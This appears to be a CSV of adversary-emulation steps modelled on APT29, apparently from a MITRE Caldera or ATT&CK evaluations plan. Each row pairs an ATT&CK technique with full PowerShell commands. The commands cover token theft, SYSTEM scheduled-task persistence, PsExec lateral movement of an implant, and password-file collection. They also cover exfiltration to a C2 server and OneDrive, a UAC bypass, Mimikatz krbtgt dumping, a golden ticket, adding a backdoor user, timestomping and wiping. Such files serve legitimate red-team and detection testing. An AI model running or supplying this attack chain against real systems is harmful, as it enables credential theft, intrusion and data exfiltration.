+apt29,apt29,APT29,7,46,6b90da47-13d0-48fc-8f07-0a1e6d5d876e,7.C.1,defensive-evasion,T1134.001,Access Token Manipulation: Token Impersonation/Theft,Scheduled Tasks (T1053),"A token theft script was executed to steal and assume the token of another user’s existing process, changing the user context of the process.","Import-Module .\StealToken.ps1 -Verbose -Force; StealToken; CreateProcessWithToken -CommandLine 'cmd.exe /c reg query ""\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server""'; CreateProcessWithT...","Import-Module .\StealToken.ps1 -Verbose -Force;
+StealToken;
+CreateProcessWithToken -CommandLine 'cmd.exe /c reg query ""\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server""';
+CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn ""Resume Viewer Update Checker"" /tr "".\sandcat.exe #{server} evals"" /sc ONLOGON /RU SYSTEM';
+CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
+CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
+RevertToSelf;"
+apt29,apt29,APT29,8,47,95564347-e77a-4a89-b08f-dcafa5468f2c,8.A.1,execution,T1059.001,Command and Scripting Interpreter: PowerShell,Remote System Discovery (T1018),Custom PowerShell script to perform AD triage for domain bound computers.,"if (! $(test-path -path ""C:\Program Files\SysinternalsSuite"")) { write-host ""[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped.""; exit 1; } Set-Location -path ""C:\Program Files\Sysi...","if (! $(test-path -path ""C:\Program Files\SysinternalsSuite"")) {
+  write-host ""[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped."";
+  exit 1;
+}
+
+Set-Location -path ""C:\Program Files\SysinternalsSuite"";
+. .\psversion.ps1;
+Ad-Search Computer Name *;"
+apt29,apt29,APT29,8,48,c4a59e39-53b0-4ace-9528-8ff052752ece,8.A.2,execution,T1059.001,Command and Scripting Interpreter: PowerShell,Identifying current user on other machines,Custom PowerShell script to perform AD triage for domain bound computers.,"Invoke-Command -ComputerName ""$(hostname)"" -ScriptBlock { Get-Process -IncludeUserName | Select-Object UserName,SessionId | Where-Object { $_.UserName -like ""*\$env:USERNAME"" } | Sort-Object SessionId -Unique } | Sele...","Invoke-Command -ComputerName ""$(hostname)"" -ScriptBlock { Get-Process -IncludeUserName | Select-Object UserName,SessionId | Where-Object { $_.UserName -like ""*\$env:USERNAME"" } | Sort-Object SessionId -Unique } | Select-Object UserName,SessionId -Last 1;"
+apt29,apt29,APT29,8,49,9fefcde6-083a-4440-8eca-dc03d30c0bcb,8.A.3,defensive-evasion,T1134.001,Access Token Manipulation: Token Impersonation/Theft,File and Directory Discovery (T1083),"A token theft script was executed to steal and assume the token of another user’s existing process, changing the user context of the process.","Import-Module .\StealToken.ps1 -Verbose -Force; StealToken; CreateProcessWithToken -CommandLine 'cmd.exe /c reg query ""\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server""'; CreateProcessWithT...","Import-Module .\StealToken.ps1 -Verbose -Force;
+StealToken;
+CreateProcessWithToken -CommandLine 'cmd.exe /c reg query ""\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server""';
+CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn ""Resume Viewer Update Checker"" /tr "".\sandcat.exe #{server} evals"" /sc ONLOGON /RU SYSTEM';
+CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
+CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
+RevertToSelf;"
+apt29,apt29,APT29,8,50,bddc0abc-07a0-41b7-813f-e0c64d9226b3,8.B,lateral-movement,T1105,Ingress Tool Transfer,Copy Sandcat File,Copy Sandcat file using PsExec,"move-item sandcat.go-windows-upx C:\Windows\temp\python.exe -force; set-location ""C:\Program Files\SysinternalsSuite\""; .\PsExec64.exe -accepteula \\#{pivot_machine_hostname} -i #{user.session.id} -d -f -c ""C:\Windows...","move-item sandcat.go-windows-upx C:\Windows\temp\python.exe -force;
+set-location ""C:\Program Files\SysinternalsSuite\"";
+.\PsExec64.exe -accepteula \\#{pivot_machine_hostname} -i #{user.session.id} -d -f -c ""C:\Windows\Temp\python.exe"" -group ""day-1-lateral-movement"" -server ""#{server}"";
+tasklist /S #{pivot_machine_hostname} /FI ""IMAGENAME eq python.exe"";"
+apt29,apt29,APT29,8,51,0b1841bd-ef8b-475c-bce7-8fcb2860984a,8.D.1,collection,T1113,Screen Capture,Screen Capture (T1113),Native API call(s) were used to collect a screenshot.,Import-Module .\Get-Screenshot.ps1 -Verbose -Force; Get-Screenshot;,"Import-Module .\Get-Screenshot.ps1 -Verbose -Force;
+Get-Screenshot;"
+apt29,apt29,APT29,9,52,d5170a60-3bdc-44e0-9870-a38db5c0cf81,9.A.1,discovery,T1083,File and Directory Discovery,File and Directory Discovery (T1083),PowerShell's Get-ChildItem alias 'ls' is used to enumerate files in a remote file share.,ls #{remote.file.share},ls #{remote.file.share}
+apt29,apt29,APT29,9,53,08e57385-dbce-4850-8bb7-589ef79465ab,9.B.1,execution,T1059.001,Command and Scripting Interpreter: PowerShell,Automated document collection (T1119),Execute PowerShell collection command to collect and compress files of specific extensions.,"move-item Rar.exe -Destination C:\Windows\Temp -Force; $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*....","move-item Rar.exe -Destination C:\Windows\Temp -Force;
+$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\working.zip -Force;
+cd C:\Windows\Temp;
+.\Rar.exe a -hpfGzq5yKw ""$env:USERPROFILE\Desktop\working.zip"" ""$env:APPDATA\working.zip"";"
+apt29,apt29,APT29,9,54,2d18c8ec-4593-49dc-9bf4-11d0673d6ae6,9.B.8,exfiltration,T1041,Exfiltration Over C2 Channel,Data from staged file (T1074) and Exfiltration over C2 Channel (T1041),Copy a target file from a remote file share through the existing C2 channel,"Import-Module .\upload.ps1 -Verbose -Force; Invoke-MultipartFormDataUpload -InFile ""C:\Users\#{profile_user}\Desktop\working.zip"" -Uri ""#{server}/file/upload"";","Import-Module .\upload.ps1 -Verbose -Force;
+Invoke-MultipartFormDataUpload -InFile ""C:\Users\#{profile_user}\Desktop\working.zip"" -Uri ""#{server}/file/upload"";"
+apt29,apt29,APT29,9,55,208b021b-c79a-4176-8ad1-3af99ed50c6f,9.C,defensive-evasion,T1070.004,Indicator Removal on Host: File Deletion,Artifact Cleanup - Delete Staged Files,Cleanup files related to Operation,"if (!$(test-path -path ""C:\Program Files\SysInternalsSuite"")) { mkdir ""C:\Program Files\SysInternalsSuite""; } set-location ""C:\Program Files\SysInternalsSuite""; if (!$(test-path -path ""sdelete64.exe"")) { iwr -uri ""htt...","if (!$(test-path -path ""C:\Program Files\SysInternalsSuite"")) {
+  mkdir ""C:\Program Files\SysInternalsSuite"";
+}
+set-location ""C:\Program Files\SysInternalsSuite"";
+
+if (!$(test-path -path ""sdelete64.exe"")) {
+  iwr -uri ""https://download.sysinternals.com/files/SDelete.zip"" -outfile sdelete64.zip;
+  Expand-Archive sdelete64.zip -force;
+}
+copy sdelete64.exe C:\Windows\Temp\;
+cd C:\Windows\Temp\ ;
+.\sdelete64.exe /accepteula C:\Windows\Temp\Rar.exe;
+.\sdelete64.exe /accepteula C:\Users\#{profile_user}\AppData\Roaming\working.zip;
+.\sdelete64.exe /accepteula C:\Users\#{profile_user}\Desktop\working.zip;
+remove-item C:\Windows\Temp\sdelete64.exe -force;"
+apt29,apt29,APT29,10,56,4b2e9574-b1a7-4b38-95b2-6054ded9c4fe,10.A.2,impact,T1529,System Shutdown/Reboot,Scheduled Task,Reboot the machine to aid in peristence callbacks,"write-host ""[*] Restarting Computer""; Restart-Computer -Force;","write-host ""[*] Restarting Computer"";
+Restart-Computer -Force;"
+apt29,apt29,APT29,10,57,4bedbd9b-a570-4f9f-b78a-2f7f99ad5e92,10.A.3,defensive-evasion,T1070.004,Indicator Removal on Host: File Deletion,Artifact Cleanup,Delete file artifacts left from the operation.,"Remove-Item -Path ""$env:USERPROFILE\Downloads\*.pfx"" -Force; Remove-Item -Path ""$env:USERPROFILE\Downloads\*.bmp"" -Force; Remove-Item -Path ""$env:USERPROFILE\Downloads\*.png"" -Force; if (test-path -path ""$env:APPDATA\...","Remove-Item -Path ""$env:USERPROFILE\Downloads\*.pfx"" -Force;
+Remove-Item -Path ""$env:USERPROFILE\Downloads\*.bmp"" -Force;
+Remove-Item -Path ""$env:USERPROFILE\Downloads\*.png"" -Force;
+if (test-path -path ""$env:APPDATA\OfficeSupplies.7z"") {
+    Remove-Item -Path ""$env:APPDATA\OfficeSupplies.7z"" -Force; write-host ""[+] Successfully removed OfficeSupplies.7z"";
+} else {
+    write-host ""[!] File did not exist to be removed!"";
+}
+
+if (get-job -name ""Keystrokes"" -ErrorAction SilentlyContinue) {
+    Remove-Job -Name ""Keystrokes"";
+    if ($?) {
+        write-host ""[+] Job \""Keystrokes\"" was remove."";
+    }
+} else {
+    write-host ""[!] Job \""Keystrokes\"" did not exist."";
+}
+
+if (get-job -Name ""Screenshot"" -ErrorAction SilentlyContinue) {
+    Remove-Job -Name ""Screenshot"" -Force;
+    write-host ""[+] Job \""screenshot\"" was removed."";
+} else {
+    write-host ""[*] Job \""screenshot\"" does not exist, thus was not removed."";
+}
+remove-item upload.ps1 -Force;"
+apt29,apt29,APT29,10,58,00446217-53ca-4749-bacd-f41fe189d36e,10.B,lateral-movement,T1037.005,Boot or Logon Initialization Scripts: Startup Items,Startup Folder Persistence Execution,Sets credentials for a headless RDP session to spawn triggering startup folder persistence.,cmdkey /add:127.0.0.2 /user:#{profile_user} /pass:#{profile_user_password}; mstsc /v:127.0.0.2; sleep 10; Get-Process -name mstsc; if ($?) { taskkill.exe /F /IM mstsc.exe; exit 0; } else {exit 1;},"cmdkey /add:127.0.0.2 /user:#{profile_user} /pass:#{profile_user_password};
+mstsc /v:127.0.0.2;
+sleep 10;
+Get-Process -name mstsc;
+if ($?) { taskkill.exe /F /IM mstsc.exe; exit 0; } else {exit 1;}"
+apt29,apt29,APT29,11,59,e506f811-884d-4992-aacb-514b33a0324f,11.A,execution,T1204.002,User Execution: Malicious File,Click .LNK payload,Execute PowerShell collection command to collect and compress files of specific extensions.,"Set-Location -Path ""C:\Users\#{profile_user_day2}\Desktop""; if(Test-Path -LiteralPath ""$env:appdata\Microsoft\kxwn.lock""){ Remove-Item ""$env:appdata\Microsoft\kxwn.lock"" -Force; Write-Host ""Removed old kxwn.lock file""...","Set-Location -Path ""C:\Users\#{profile_user_day2}\Desktop"";
+
+if(Test-Path -LiteralPath ""$env:appdata\Microsoft\kxwn.lock""){
+  Remove-Item ""$env:appdata\Microsoft\kxwn.lock"" -Force;
+  Write-Host ""Removed old kxwn.lock file"";
+}
+
+powershell.exe Get-Content '.\2016_United_States_presidential_election_-_Wikipedia.html' -Stream schemas | IEX;"
+apt29,apt29,APT29,12,60,4a2ad84e-a93a-4b2e-b1f0-c354d6a41278,12.A,defensive-evasion,T1070.006,Indicator Removal on Host: Timestomp,Timestomp kxwn.lock,Timestomp kxwn.lock,"if (!(test-path -path ""$env:appdata\Microsoft\kxwn.lock"")) { write-host ""[!] kxwn.lock was not found on this host.""; exit 1; } else { . .\timestomp.ps1; timestomp -dest ""$env:appdata\Microsoft\kxwn.lock""; }","if (!(test-path -path ""$env:appdata\Microsoft\kxwn.lock"")) {
+  write-host ""[!] kxwn.lock was not found on this host."";
+  exit 1;
+} else {
+  . .\timestomp.ps1;
+  timestomp -dest ""$env:appdata\Microsoft\kxwn.lock"";
+}"
+apt29,apt29,APT29,12,61,f9c0b150-822f-497b-ad6d-187f24561e9a,12.B,discovery,T1518.001,Software Discovery: Security Software Discovery,Detect Anti-Virus,Detect anti-virus software on host,. .\stepTwelve.ps1; detectav,". .\stepTwelve.ps1;
+detectav"
+apt29,apt29,APT29,12,62,2b5a72b1-01e4-48ae-98b0-2570a7894371,12.C,discovery,T1518,Software Discovery,Detect Software,Detect software on host,. .\stepTwelve.ps1; software;,". .\stepTwelve.ps1;
+software;"
+apt29,apt29,APT29,13,63,0cfadbcb-ec21-44ae-adb7-9a23176dd620,13.A,discovery,T1082,System Information Discovery,Enumerate Computer Name,"Triage host for ComputerNameNetBIOS,ComputerNameDnsHostname,ComputerNameDnsDomain,ComputerNameDnsFullyQualified,ComputerNamePhysicalNetBIOS,ComputerNamePhysicalDnsHostname,ComputerNamePhysicalDnsDomain,ComputerNamePhysical,DnsFullyQualifie",. .\stepThirteen.ps1; comp;,". .\stepThirteen.ps1;
+comp;"
+apt29,apt29,APT29,13,64,96140694-6d13-40b6-9553-0e63533469f3,13.B,discovery,T1082,System Information Discovery,Enumerate Domain Name,Domain triage,. .\stepThirteen.ps1; domain;,". .\stepThirteen.ps1;
+domain;"
+apt29,apt29,APT29,13,65,f320eebd-e75b-4194-b529-79e64ad0b9ee,13.C,discovery,T1033,System Owner/User Discovery,Enumerate Username,user triage,. .\stepThirteen.ps1; user;,". .\stepThirteen.ps1;
+user;"
+apt29,apt29,APT29,13,66,a34ab8f2-a106-41fb-af0b-cf5382bd18ae,13.D,discovery,T1057,Process Discovery,Enumerate Processes,Process triage,. .\stepThirteen.ps1; pslist;,". .\stepThirteen.ps1;
+pslist;"
+apt29,apt29,APT29,14,67,5226e5dc-fc28-43b7-a679-0db49d520402,14.A,defensive-evasion,T1134.002,Access Token Manipulation: Create Process with Token,UAC Bypass via sdctl,Invoke UAC bypass sdctl,. .\stepFourteen_bypassUAC.ps1; bypass;,". .\stepFourteen_bypassUAC.ps1;
+bypass;"
+apt29,apt29,APT29,14,68,4ef6009d-2d62-4bb4-8de9-0458df2e9567,14.B,credential-access,T1003,Credential Dumping,Credential Dumping,Dumping credentials via wmidump (Mimikatz),. .\stepFourteen_credDump.ps1;,. .\stepFourteen_credDump.ps1;
+apt29,apt29,APT29,14,69,1dba454c-0e4f-4fe0-8bc9-b17e8c5c9a24,14.C,credential-access,T1003,Credential Dumping,Stage Mimikatz Binary,Staging Mimikatz Binary for later execution,"write-host ""[+] Successfully downloaded m.exe"";","write-host ""[+] Successfully downloaded m.exe"";"
+apt29,apt29,APT29,15,70,43aad2d6-d16a-4adb-aa2b-9510a3be4c52,15.A,persistence,T1546.003,Event Triggered Execution: Windows Management Instrumentation Event Subscription,WMI Persistence technique,user triage,"Get-WmiObject -Namespace ""root/subscription"" -list | findstr /i ""__Filter""; if ($?) { write-host ""[*] WMI script has already executed on this machine. Not loading and executing wmi script.""; exit 1; } else { . .\stepF...","Get-WmiObject -Namespace ""root/subscription"" -list | findstr /i ""__Filter"";
+if ($?) {
+  write-host ""[*] WMI script has already executed on this machine. Not loading and executing wmi script."";
+  exit 1;
+} else {
+  . .\stepFifteen_wmi.ps1;
+  wmi;
+  if ($?) {
+    write-host ""[+] WMI script has successfully executed!"";
+    exit 0;
+  }
+  exit 1;
+}"
+apt29,apt29,APT29,16,71,1c8552c7-f7ed-4523-b640-72d65af5f855,16.A,discovery,T1018,Remote System Discovery,Enumerate Domain Controller,Get domain controller and current user SID for the domain,. .\powerview.ps1; get-netdomaincontroller;,". .\powerview.ps1;
+get-netdomaincontroller;"
+apt29,apt29,APT29,16,72,a42be479-fc26-4d7c-9e63-7a9b74e4c8d2,16.B,discovery,T1033,System Owner/User Discovery,Enumerate Domain SID,Get domain user SID,. .\stepSixteen_SID.ps1; siduser;,". .\stepSixteen_SID.ps1;
+siduser;"
+apt29,apt29,APT29,16,73,acecc8f7-18c2-41fd-87bc-39ffd644e4e9,16.C,lateral-movement,T1105,Ingress Tool Transfer,Remote Connection (T1028) & Remote File Copy (T1105) & Credential Dumping,Establish connection to Domain Controller,". .\invoke-winrmsession.ps1; $session = invoke-winrmsession -Username ""#{target.winrm.username}"" -Password ""#{target.winrm.password}"" -IPAddress ""#{target.winrm.remote_host}""; Copy-Item m.exe -Destination ""C:\Windows\...",". .\invoke-winrmsession.ps1;
+$session = invoke-winrmsession -Username ""#{target.winrm.username}"" -Password ""#{target.winrm.password}"" -IPAddress ""#{target.winrm.remote_host}"";
+Copy-Item m.exe -Destination ""C:\Windows\System32\\"" -ToSession $session -force;
+if ($?) {
+  write-host ""[+] Successfully copied m.exe to remote host"";
+} else {
+  write-host ""[!] Error, copying and executing m.exe on remote host"";
+}
+Invoke-Command -Session $session -scriptblock {C:\Windows\System32\m.exe privilege::debug ""lsadump::lsa /inject /name:krbtgt"" exit} | out-string"
+apt29,apt29,APT29,17,74,b1dcc53a-c86c-46ba-8a3d-e1da74a8db3c,17.A,collection,T1114.001,Email Collection: Local Email Collection,Collect E-mails,Perform e-mail collection from custom PowerShell module.,". .\stepSeventeen_email.ps1; Write-Host ""Emails Collected"";",". .\stepSeventeen_email.ps1;
+Write-Host ""Emails Collected"";"
+apt29,apt29,APT29,17,75,fc231955-774f-442c-ac0e-e74dfda50c5c,17.B,collection,T1005,Data from Local System,Collect Files & Compress Collection,Collect a specific document from a target machine.,"try{ if (!(test-path -path ""C:\Windows\Temp\WindowsParentalControlMigration"" -ErrorAction Stop)) { New-Item -Path ""C:\Windows\temp\"" -Name ""WindowsParentalControlMigration"" -ItemType ""directory"" -force; } } catch { wr...","try{
+  if (!(test-path -path ""C:\Windows\Temp\WindowsParentalControlMigration"" -ErrorAction Stop)) {
+    New-Item -Path ""C:\Windows\temp\"" -Name ""WindowsParentalControlMigration"" -ItemType ""directory"" -force;
+  }
+} catch {
+  write-host ""[!] Access is denied. Manually browse to C:\Windows\Temp via Explorer and accept prompt"";
+  exit 1;
+}
+
+if (! (test-path -path ""C:\Users\#{profile_user_day2}\Documents\MITRE-ATTACK-EVALS.HTML"")) {
+  write-host ""[!] Error, MITRE-ATTACK-EVALS.HTML was not found."";
+  exit 1;
+}
+Copy-Item ""C:\Users\#{profile_user_day2}\Documents\MITRE-ATTACK-EVALS.HTML"" -Destination ""C:\Windows\Temp\WindowsParentalControlMigration"" -force;
+. .\stepSeventeen_zip.ps1;
+zip C:\Windows\Temp\WindowsParentalControlMigration.tmp C:\Windows\Temp\WindowsParentalControlMigration;
+if ($?) {
+  write-host ""[+] Documents successfully staged for collection."";
+}"
+apt29,apt29,APT29,18,76,4840d6dd-da13-401a-be46-05db56f4e1e0,18.A,exfiltration,T1537,Transfer Data to Cloud Account,Exfiltrate data to OneDrive,Transfer data to a OneDrive account,"$err = $(net use y: #{onedrive.url} /user:#{onedrive.username} ""#{onedrive.password}"" 2>&1); if($err -Like ""*System error 85*"") { Write-Host ""OneDrive net drive is already mounted!""; } elseif($err -Like ""*System error...","$err = $(net use y: #{onedrive.url} /user:#{onedrive.username} ""#{onedrive.password}"" 2>&1);
+if($err -Like ""*System error 85*"") {
+  Write-Host ""OneDrive net drive is already mounted!"";
+} elseif($err -Like ""*System error 67*"") {
+  Write-Host ""OneDrive net drive mount failed - Check URL!"";
+  Write-Host ""#{onedrive.url}"";
+  exit 1;
+} elseif($err -Like ""*System error 1244*"") {
+  Write-Host ""Could not authenticate to OneDrive - Check Creds!"";
+  Write-Host ""User: #{onedrive.username}"";
+  Write-Host ""Password: #{onedrive.password}"";
+  exit 1;
+}
+
+Write-Host ""Mount Successful""
+Copy-Item ""C:\Windows\Temp\WindowsParentalControlMigration.tmp"" -Destination ""y:\WindowsParentalControlMigration.tmp"" -Force;
+if(!$?){
+  exit 1;
+}
+
+Write-Host ""Copy Successfull""
+exit 0;"
+apt29,apt29,APT29,19,77,f820b93d-6176-4a72-a138-a70b0b549c49,19.A,impact,T1561.001,Disk Wipe: Disk Content Wipe,Data Wiping of staged files,Securely delete previously staged files.,". .\wipe.ps1; wipe ""m.exe""; wipe ""C:\Windows\Temp\WindowsParentalControlMigration.tmp""; wipe ""C:\Windows\Temp\WindowsParentalControlMigration\MITRE-ATTACK-EVALS.HTML"";",". .\wipe.ps1;
+wipe ""m.exe"";
+wipe ""C:\Windows\Temp\WindowsParentalControlMigration.tmp"";
+wipe ""C:\Windows\Temp\WindowsParentalControlMigration\MITRE-ATTACK-EVALS.HTML"";"
+apt29,apt29,APT29,20,78,267bad86-3f06-49f1-9a3e-6522f2a61e7a,20.A.1,credential-access,T1003,Credential Dumping,Execute Invoke-Mimikatz,Perfofrm Mimikatz credential collection,"klist purge; . .\Invoke-Mimikatz.ps1; invoke-mimikatz -command ""kerberos::golden /domain:#{target.domain.name} /sid:#{target.sid} /rc4:#{target.ntlm} /user:#{target.winrm.username} /ptt""; klist; invoke-command -Comput...","klist purge;
+. .\Invoke-Mimikatz.ps1;
+invoke-mimikatz -command ""kerberos::golden /domain:#{target.domain.name} /sid:#{target.sid}  /rc4:#{target.ntlm} /user:#{target.winrm.username} /ptt"";
+klist;
+invoke-command -ComputerName scranton -ScriptBlock {net user /add toby ""pamBeesly<3""};"
+apt29,apt29,APT29,20,79,afb8d8f7-d059-4825-95ae-c5727e2db320,20.B,persistence,T1218.011,Signed Binary Proxy Execution: Rundll32,Triggering Persistent,Trigger RegKey persistence by rebooting the machine,Restart-Computer -Force;,Restart-Computer -Force;
